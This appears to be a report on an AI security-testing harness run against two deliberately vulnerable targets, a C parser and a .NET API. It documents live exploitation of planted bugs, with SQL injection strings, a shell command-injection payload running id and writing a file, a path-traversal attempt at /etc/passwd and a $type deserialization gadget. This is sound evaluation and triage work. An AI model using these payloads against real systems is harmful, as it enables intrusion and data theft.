An AI security harness, run end to end on two planted-bug targets.

The harness was exercised across its whole pipeline against two purpose-built, uncontaminated targets — a C parser with an AddressSanitizer crash oracle and a .NET web API scanned statically, then attacked live. Every planted bug was accounted for. The live pass then showed the part a static scan can't: which findings actually fire over HTTP on .NET 8, and which the platform quietly neutralizes.

01

Two targets, two ways to be sure

The harness has two evaluation modes, and this repo ships one target built for each. The difference between them is whether there's an oracle — something that can mechanically prove a finding is real, with no human in the loop. That single distinction decides how much you can trust a result, and how much contamination matters.

Mode A · C target

Oracle: yes

A find means craft → run → verified crash. Knowing a bug exists isn't enough — you must land a reproducing input. Contamination risk is low: recall can't fake a crash.

Mode B · .NET target

Oracle: none

The scanner just claims "SQLi at line 21." Recall looks identical to discovery — so contamination risk is high, and the source is kept original and unmarked with the answer key stored outside the scanned tree.

04

The live pentest — real HTTP

targets/issueblotoffense

Static analysis proves a dangerous sink exists; it can't tell you whether the exploit survives the running app. So the .NET API was stood up as a live server (Kestrel :5080), seeded with a SQLite row marked CONFIDENTIAL, and each endpoint attacked with real requests. The result splits the five sinks cleanly: three fire, two are framework-latent on .NET 8.

V1 · CWE-89

SQL injection — /issues/search

exploitedsink · command.CommandText = "… LIKE '%" + query + "%' …"

The q parameter is concatenated straight into the query. A search that should match nothing returns every row — including the confidential one — and a UNION reads from an unrelated query.

GET /issues/search?q=…
# baseline — no such issue
?q=zzz-no-such-issue              → []

# filter bypass — dump everything
?q=' OR 1=1--                     → ["CONFIDENTIAL: prod DB credentials rotation",
                                     "Login page typo", "Dark mode request", …]

# extraction from a different query
?q=' UNION SELECT sqlite_version()--   → ["3.41.2", …]
verdictConfirmed exploitable. Full read of the table regardless of the intended filter.
V2 · CWE-78

OS command injection — /reports/export

exploited · RCEsink · Arguments = "-c \"pandoc … /tmp/report_" + label + ".out\""

The label is concatenated into a /bin/sh -c string. Shell metacharacters break out and run commands as the server user; their stdout returns in the HTTP response.

POST /reports/export {"format":"html","label":"…"}
label = x; id; echo INJECTED_ON_$(hostname); touch /tmp/pwned_by_issueblot; echo rce_ok #

# ← HTTP 200 response body (the injected command's stdout):
uid=1000(vscode) gid=1000(vscode) groups=1000(vscode),999(docker),…
INJECTED_ON_codespaces-aa33f9
rce_ok
# host-FS side effect: /tmp/pwned_by_issueblot  created
verdictConfirmed remote code execution. id output returned to the attacker; a file written to disk.
V5 · CWE-327 · 798

Weak hash + hardcoded pepper — /users/register

exploitedsink · MD5.Create() over (password + const Pepper = "s3cr3t-pepper-v1")

Registration returns an MD5 hash peppered with a secret hardcoded in the source. Because the pepper is knowable and MD5 is fast, a leaked hash falls instantly.

POST /users/register → offline recompute
server hash for "hunter2" = A9B0C1B131E82593220F84C8C090D1EF

MD5("hunter2" + "s3cr3t-pepper-v1") = a9b0c1b131e82593220f84c8c090d1ef  ← MATCH (verified)
# pepper lifted from source → adds zero entropy to the attack
verdictConfirmed. Recomputing with the source-known pepper reproduces the server output exactly — the "secret" protects nothing.
V4 · CWE-22

Path traversal — /attachments/{name}

latent · framework-mitigatedsink · File.ReadAllBytes(Path.Combine(_storageRoot, name))

The code has no containment check — a real ../ or absolute path would escape the storage root. But over HTTP, .NET 8's Kestrel keeps %2f literal for a single-segment {name} route and normalizes real .. before routing, so the documented trigger never lands a real slash in the handler.

GET /attachments/…
# baseline — legit file inside the root
/attachments/notes.txt                        → "public release notes v1"

# documented traversal trigger — reaches the sink, but %2f stays literal:
/attachments/..%2f..%2f..%2f..%2fetc%2fpasswd   → HTTP 500
   opened: '/var/issueblot/attachments/..%2f..%2f..%2fetc%2fpasswd'  ← not decoded
verdictReal code flaw, not exploitable over this route on default Kestrel. Would fire behind a proxy that decodes %2f, or from any non-HTTP caller of Read(). Static was right about the sink; live testing bounded the reachability.
V3 · CWE-502

Insecure deserialization — /backups/restore

sink proven · HTTP path guardedsink · JsonConvert.DeserializeObject(body, { TypeNameHandling.All })

Over HTTP the endpoint throws before the deserializer runs — reader.ReadToEnd() is a synchronous body read, which ASP.NET Core blocks by default (AllowSynchronousIO=false). To prove the sink is genuinely dangerous, the target's own compiled Restore() was invoked directly.

HTTP path → then direct invocation of the target's Restore()
# over HTTP, every body: HTTP 500  "Synchronous operations are disallowed"
                        at BackupService.cs:16  (before the deserializer)

# direct call into the target's compiled method:
body {"note":"nightly"}                        → JObject                    (safe)
body {"$type":"System.Text.StringBuilder,…"}   → System.Text.StringBuilder   ← arbitrary type from the wire
body {"$type":"PwnGadget.RemoteCode, EvilAssembly"} → reaches for 'EvilAssembly'  ← RCE precondition
verdictTypeNameHandling.All honors an attacker $type and reaches for attacker-named assemblies. Not reachable via this endpoint as-wired; reachable if the body read were async, or from any other caller.
05

The insight: static ≠ live reachability

Neither latent finding is a false positive — the code is genuinely unsafe in both. What the live pass adds is the reachability verdict the platform imposes on top of the source. That gap is precisely the information a live pentest contributes over a static scan, and it's what turns a flat list of five HIGHs into a ranked, deployment-aware picture.

A real sink is not always a real exploit. The harness tells you which; a scanner alone can't.

Triage — from raw scan to a ranked worklist

offense

The /triage skill re-derived each finding from source, re-scored by real exploitability, and folded in the live-reachability evidence. This is where a severity-inflated scan becomes a worklist you can hand to an engineer.

targets/mrt · C

4 in → 4 confirmed

2 HIGH, 2 MEDIUM, 0 dropped. Every finding is execution-verified under ASAN — unusually strong verification, so nothing needed manual follow-up.

targets/issueblot · .NET

7 in → 4 + 2 + 1

4 exploitable-confirmed (SQLi, RCE, both crypto issues), 2 real-but-gated sent to needs-manual-test (deserialization, path traversal), 1 dropped.

The instructive part — triage doing its actual job

  • It downgraded two scanner-HIGHs (deserialization, path traversal) to needs-manual-test, because the live run proved their HTTP paths are gated — not because the code is safe.
  • It dropped the no-auth finding as missing-hardening-only: no standalone exploit, and auth is explicitly out of scope in the target's threat model. It survives as an amplifier recorded in the threat model, not a discrete bug.
  • It kept V5a and V5b distinct — fixing MD5 doesn't remove the hardcoded secret, so they're separate work items.

The defensive half — detection & response

defense

Everything above is offense: find → exploit → fix. The harness also has a blue-team track that works over logs, not source. It had no target in this repo — so one was built from the real attack traffic the live pentest generated, mixed into a day of benign requests, and the hunt was run cold with no alert in hand.

09

What this run proves — and what's next

Bottom line

  • The machinery works. 4/4 verified crashes with distinct sanitizer signatures; 6/6 static findings with zero misses. A null result on unseen code would now be trustworthy — the tool is sound, not silent.
  • Live testing bounds reachability. The static scan was right about all five .NET sinks; only three fire over HTTP as the app is wired on .NET 8. Naming that gap is what a live pass adds over a scan.
  • The loop closes end to end. Model → find → prove → triage → fix → hunt → respond, with the same two incidents appearing as compromises on offense and as caught intrusions on defense.
  • Contamination is controlled. Original, unmarked targets; answer keys kept outside the scanned trees. A find reflects reasoning, not recall.

The one thing this run can't prove is capability on code the model has never seen — these targets are known-answer by construction, which is exactly what makes a null result meaningful. The natural next step is to point the same rig at genuinely unseen code: your own private repositories. That's the only fully uncontaminated capability test, and it's the thing worth measuring.
